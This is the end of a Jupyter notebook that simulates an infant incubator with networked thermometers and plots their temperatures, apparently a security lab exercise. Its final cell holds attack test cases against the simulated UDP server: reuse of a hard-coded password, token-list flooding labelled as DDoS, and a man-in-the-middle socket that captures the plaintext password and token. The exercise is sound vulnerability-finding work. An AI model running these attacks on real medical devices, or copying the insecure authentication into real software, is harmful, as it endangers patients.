    "                            self.processCommands(msg[semi+1:], addr)\n",
    "                        else :\n",
    "                            self.serverSocket.sendto(b\"Bad Token\\n\", addr)\n",
    "                    else :\n",
    "                            self.serverSocket.sendto(b\"Bad Command\\n\", addr)\n",
    "                elif len(cmds) == 2 :\n",
    "                    if cmds[0] in self.open_cmds : #if its AUTH or LOGOUT\n",
    "                        self.processCommands(msg, addr) \n",
    "                    else :\n",
    "                        self.serverSocket.sendto(b\"Authenticate First\\n\", addr)\n",
    "                else :\n",
    "                    # otherwise bad command\n",
    "                    self.serverSocket.sendto(b\"Bad Command\\n\", addr)\n",
    "    \n",
    "            except IOError as e :\n",
    "                if e.errno == errno.EWOULDBLOCK :\n",
    "                    #do nothing\n",
    "                    pass\n",
    "                else :\n",
    "                    #do nothing for now\n",
    "                    pass\n",
    "                msg = \"\"\n",
    "\n",
    " \n",
    "\n",
    "            self.updateTemperature()\n",
    "            time.sleep(self.updatePeriod)\n",
    "\n",
    "\n",
    "class SimpleClient :\n",
    "    def __init__(self, therm1, therm2) :\n",
    "        self.fig, self.ax = plt.subplots()\n",
    "        now = time.time()\n",
    "        self.lastTime = now\n",
    "        self.times = [time.strftime(\"%H:%M:%S\", time.localtime(now-i)) for i in range(30, 0, -1)]\n",
    "        self.infTemps = [0]*30\n",
    "        self.incTemps = [0]*30\n",
    "        self.infLn, = plt.plot(range(30), self.infTemps, label=\"Infant Temperature\")\n",
    "        self.incLn, = plt.plot(range(30), self.incTemps, label=\"Incubator Temperature\")\n",
    "        plt.xticks(range(30), self.times, rotation=45)\n",
    "        plt.ylim((20,50))\n",
    "        plt.legend(handles=[self.infLn, self.incLn])\n",
    "        self.infTherm = therm1\n",
    "        self.incTherm = therm2\n",
    "\n",
    "        self.ani = animation.FuncAnimation(self.fig, self.updateInfTemp, interval=500)\n",
    "        self.ani2 = animation.FuncAnimation(self.fig, self.updateIncTemp, interval=500)\n",
    "\n",
    "    def updateTime(self) :\n",
    "        now = time.time()\n",
    "        if math.floor(now) > math.floor(self.lastTime) :\n",
    "            t = time.strftime(\"%H:%M:%S\", time.localtime(now))\n",
    "            self.times.append(t)\n",
    "            #last 30 seconds of of data\n",
    "            self.times = self.times[-30:]\n",
    "            self.lastTime = now\n",
    "            plt.xticks(range(30), self.times,rotation = 45)\n",
    "            plt.title(time.strftime(\"%A, %Y-%m-%d\", time.localtime(now)))\n",
    "\n",
    "\n",
    "    def updateInfTemp(self, frame) :\n",
    "        self.updateTime()\n",
    "        self.infTemps.append(self.infTherm.getTemperature()-273)\n",
    "        #self.infTemps.append(self.infTemps[-1] + 1)\n",
    "        self.infTemps = self.infTemps[-30:]\n",
    "        self.infLn.set_data(range(30), self.infTemps)\n",
    "        return self.infLn,\n",
    "\n",
    "    def updateIncTemp(self, frame) :\n",
    "        self.updateTime()\n",
    "        self.incTemps.append(self.incTherm.getTemperature()-273)\n",
    "        #self.incTemps.append(self.incTemps[-1] + 1)\n",
    "        self.incTemps = self.incTemps[-30:]\n",
    "        self.incLn.set_data(range(30), self.incTemps)\n",
    "        return self.incLn,\n",
    "\n",
    "UPDATE_PERIOD = .05 #in seconds\n",
    "SIMULATION_STEP = .1 #in seconds\n",
    "\n",
    "#create a new instance of IncubatorSimulator\n",
    "bob = infinc.Human(mass = 8, length = 1.68, temperature = 36 + 273)\n",
    "#bobThermo = infinc.SmartThermometer(bob, UPDATE_PERIOD)\n",
    "bobThermo = SmartNetworkThermometer(bob, UPDATE_PERIOD, 23456)\n",
    "bobThermo.start() #start the thread\n",
    "\n",
    "inc = infinc.Incubator(width = 1, depth=1, height = 1, temperature = 37 + 273, roomTemperature = 20 + 273)\n",
    "#incThermo = infinc.SmartNetworkThermometer(inc, UPDATE_PERIOD)\n",
    "incThermo = SmartNetworkThermometer(inc, UPDATE_PERIOD, 23457)\n",
    "incThermo.start() #start the thread\n",
    "\n",
    "incHeater = infinc.SmartHeater(powerOutput = 1500, setTemperature = 45 + 273, thermometer = incThermo, updatePeriod = UPDATE_PERIOD)\n",
    "inc.setHeater(incHeater)\n",
    "incHeater.start() #start the thread\n",
    "\n",
    "sim = infinc.Simulator(infant = bob, incubator = inc, roomTemp = 20 + 273, timeStep = SIMULATION_STEP, sleepTime = SIMULATION_STEP / 10)\n",
    "\n",
    "sim.start()\n",
    "\n",
    "sc = SimpleClient(bobThermo, incThermo)\n",
    "\n",
    "# Write Test cases\n",
    "\n",
    "# 1- Get Hard Coded Password\n",
    "sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "sock.sendto(b\"AUTH !Q#E%T&U8i6y4r2w\", (\"127.0.0.1\", 23456))\n",
    "print(\"sent\")\n",
    "token, addr = sock.recvfrom(1024)\n",
    "token = token.decode()\n",
    "print(\"token\", token)\n",
    "sock.sendto((\"LOGOUT \" + token).encode(), (\"127.0.0.1\", 23456))\n",
    "\n",
    "# 2- Token List Grows, probably increase to VERY big number?\n",
    "for i in range(10):\n",
    "    sock.sendto(b\"AUTH !Q#E%T&U8i6y4r2w\", (\"127.0.0.1\", 23456))\n",
    "    token, addr = sock.recvfrom(1024)\n",
    "    token = token.decode()\n",
    "    print(\"DDOS LIST TOKEN\", token)\n",
    "\n",
    "    # because an invalid token is passed, no token is removed in self.list\n",
    "    sock.sendto(b\"LOGOUT random-token\", (\"127.0.0.1\", 23456))\n",
    "\n",
    "# 3- Plaintext authentication, use MITM to capture stuff\n",
    "mitmSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "mitmSocket.bind((\"127.0.0.2\", 23456))\n",
    "fcntl.fcntl(mitmSocket, fcntl.F_SETFL, os.O_NONBLOCK)\n",
    "\n",
    "# Client authenticates, MITM grabs Client Auth Token\n",
    "sock.sendto(b\"AUTH !Q#E%T&U8i6y4r2w\", (\"127.0.0.2\", 23456))\n",
    "auth_password, client_addr = mitmSocket.recvfrom(1024)\n",
    "print(\"MITM STOLE\", auth_password)\n",
    "\n",
    "# MITM captures plaintext password and forwards to server.\n",
    "mitmSocket.sendto(auth_password, (\"127.0.0.1\", 23456))\n",
    "# Give MITM time to send the request and have the token stealing time to complete.\n",
    "time.sleep(5)\n",
    "token, real_server_addr = mitmSocket.recvfrom(1024)\n",
    "print(\"MITM STOLE TOKEN\", token, real_server_addr)\n",
    "\n",
    "# End Test cases\n",
    "\n",
    "plt.grid()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c8cd4bc3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
